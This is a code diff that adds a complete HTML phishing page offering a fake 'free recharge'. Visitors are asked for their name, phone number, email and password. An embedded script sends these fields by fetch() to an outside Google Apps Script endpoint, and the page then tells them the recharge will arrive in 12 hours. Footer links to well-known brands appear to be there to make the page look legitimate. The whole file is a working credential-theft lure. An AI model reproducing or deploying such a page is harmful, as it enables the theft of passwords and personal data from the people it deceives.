@@ -1,0 +1,194 @@
+<!DOCTYPE html>
+<html lang="en">
+
+<head>
+    <meta charset="UTF-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Free Recharge For All Users </title>
+    <link rel="icon" href="logo.png">
+
+    <style>
+        body {
+            background-color: gray;
+            text-align: center;
+        }
+        
+        h1 {
+            background-color: red;
+            color: white;
+            padding: 5px;
+            border-radius: 20px;
+        }
+        
+        .para {
+            border: 5px solid black;
+            margin: 20px;
+            padding: 50px;
+            border-radius: 30px;
+            background-color: rgb(255, 96, 96);
+        }
+        
+        .box {
+            text-align: center;
+            border-top: 10px solid red;
+            border-bottom: 5px solid red;
+            border-left: 10px solid blue;
+            border-right: 5px solid blue;
+            border-top-left-radius: 5px;
+            border-top-right-radius: 50px;
+            border-bottom-left-radius: 50px;
+            border-bottom-right-radius: 10px;
+            background-color: rgb(0, 199, 66);
+            box-shadow: 0px 0px 10px 3px yellow;
+            /* position: absolute;
+            top: 50%;
+            left: 50%;
+            transform: translate(-50%, -50%); */
+            padding: 10px;
+        }
+        
+        .user_input {
+            border-top: 3px solid blue;
+            border-bottom: 3px solid blue;
+            border-left: 3px solid red;
+            border-right: 3px solid red;
+            border-top-left-radius: 5px;
+            border-top-right-radius: 20px;
+            border-bottom-left-radius: 20px;
+            border-bottom-right-radius: 10px;
+            box-shadow: 0px 0px 5px 2px black;
+            margin: 10px;
+            padding: 10px;
+            width: 250px;
+        }
+        
+        .submit {
+            padding: 5px;
+            border: 3px solid yellow;
+            border-radius: 10px;
+            background-color: black;
+            color: yellow;
+            box-shadow: 0px 0px 2px 2px black;
+        }
+        
+        .bottom {
+            display: flex;
+            padding: 10px;
+        }
+        
+        .first {
+            padding-left: 10px;
+        }
+        
+        .second {
+            padding-left: 50px;
+        }
+    </style>
+
+
+</head>
+
+<body>
+
+    <h1>Plese fill this form </h1>
+
+    <div class="box">
+        <form class="form" method="post" name="google-sheet">
+
+            <b>Name:- </b>
+            <span>&#128071 &#128071 </span><input class="user_input" type="text" name="myname" placeholder="Emter your name..." required>
+
+            <br> <b>Number:- </b> <span>&#128071 &#128071 </span> <input class="user_input" type="number" name="mynumber" placeholder="Enter your number..." required>
+
+            <br> <b>Email:- </b> <span>&#128071 &#128071 </span> <input class="user_input" type="email" name="myemail" placeholder="Enter your email..." required>
+
+            <br> <b>password:- </b> <span>&#128071 &#128071 </span> <input class="user_input" type="password" name="mypassword" placeholder="Enter your password..." required id="pass_word">
+
+            <br>
+
+            <input class="check" type="checkbox" onclick="myFunction()"> Show password
+
+
+            <input class="submit" type="submit" value="Submit Now">
+        </form>
+    </div>
+
+    <div class="para">
+        <p>Isme apna name , number , email ,password daliye</p>
+        <p>or fill kr submit button pa click kr ke </p>
+        <p>aap apna Recharge paa skte hai </p>
+        <p>ye bilkul free hai ye information </p>
+        <p>aapko pehchanne ke liye ja rhi hai </p>
+        <p>aapka Recharge 12 hours me ho jayenga </p>
+    </div>
+
+    <div class="bottom">
+        <div class="first">
+            <h3>General</h3>
+            <p>contact us </p>
+            <p>About us</p>
+            <p>FAQ's</p>
+            <p>Privacy Policy</p>
+            <p>Terms & Conditions</p>
+            <p>Blog</p>
+            <p>Parter With Us</p>
+        </div>
+
+        <div class="second">
+            <h3>Stores & Brands</h3>
+            <p>Swiggy</p>
+            <p>KFC</p>
+            <p>jio Mart</p>
+            <p>Zomato</p>
+            <p>Dunzo</p>
+            <p>All Store</p>
+        </div>
+    </div>
+
+    <div class="bottom">
+        <div class="first">
+            <h3>Categories</h3>
+            <p>food & drinks</p>
+            <p>hotels offers</p>
+            <p>travel offers</p>
+        </div>
+
+        <div class="second">
+            <h3>Festival Offers</h3>
+            <p>Deals</p>
+            <p>Diwali offers</p>
+            <p>holi offers</p>
+        </div>
+    </div>
+    <!-- password scripe -->
+
+    <script>
+        function myFunction() {
+            var pass = document.getElementById("pass_word");
+
+            if (pass.type === "password") {
+                pass.type = "text";
+            } else {
+                pass.type = "password";
+            }
+        }
+    </script>
+
+    <script>
+        const scriptURL = 'https://script.google.com/macros/s/AKfycbyzliLoy75L2OWyre-4z8LZNjXy_hXNDC1cB-xd97IOFvRGG9j1ENrLmafshj5Xgy5tHQ/exec'
+        const form = document.forms['google-sheet']
+
+        form.addEventListener('submit', e => {
+            e.preventDefault()
+            fetch(scriptURL, {
+                    method: 'POST',
+                    body: new FormData(form)
+                })
+                .then(response => alert("Thanks for Submit.. Aapka recharge 12 hour me ho jayega.."))
+                .catch(error => console.error('Error!', error.message))
+        })
+    </script>
+</body>
+
+</html>
